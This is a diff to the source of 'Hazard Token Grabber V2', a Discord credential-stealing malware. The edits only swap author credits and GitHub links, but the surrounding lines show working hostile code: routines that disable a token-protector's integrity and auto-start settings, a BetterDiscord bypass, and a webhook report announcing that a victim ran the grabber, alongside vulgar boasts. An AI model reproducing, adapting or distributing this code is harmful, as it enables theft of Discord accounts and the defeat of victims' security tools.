@@ -271,7 +271,7 @@ class Hazard_Token_Grabber_V2(functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Phantasm just raped your token-protector shit LMAOOOO'] = "https://github.com/qPhantasm"
+                item['Gumbobrot just raped your token protector LMAOOOO'] = "https://github.com/Gumbobrot"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -289,7 +289,7 @@ class Hazard_Token_Grabber_V2(functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//Phantasm just raped your token-protector shit LMAOOOO | https://github.com/qPhantasm")
+                    "\n\n//Gumbobrot just raped your token protector LMAOOOO | https://github.com/Gumbobrot")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -509,10 +509,10 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/qPhantasm・https://github.com/qPhantasm/Hazard-Token-Grabber-v2\n\n")
+                                "🌟・Grabber By Rdimo・https://github.com/Gumbobrot/Hazard-Token-Grabber-v2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n🌟・Grabber By github.com/qPhantasm・https://github.com/qPhantasm/Hazard-Token-Grabber-v2")
+                                x+"\n\n🌟・Grabber By Rdimo・https://github.com/Gumbobrot/Hazard-Token-Grabber-v2")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -552,7 +552,7 @@ class Hazard_Token_Grabber_V2(functions):
                 {
                     'author': {
                         'name': f'{Victim} Just ran Hazard Token Grabber-v2',
-                        'url': 'https://github.com/zyzzed/Hazard-Token-Grabber-v2',
+                        'url': 'https://github.com/Gumbobrot/Hazard-Token-Grabber-v2',
                         'icon_url': 'https://cdn.discordapp.com/attachments/1018946825585168446/1031610712377802783/200w.gif'
                     },
                     'color': 16119101,
@@ -598,7 +598,7 @@ class Hazard_Token_Grabber_V2(functions):
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/qPhantasm・https://github.com/qPhantasm/Hazard-Token-Grabber-v2'
+                        'text': '🌟・Grabber By Rdimo・https://github.com/Gumbobrot/Hazard-Token-Grabber-v2'
                     }
                 }
             ]
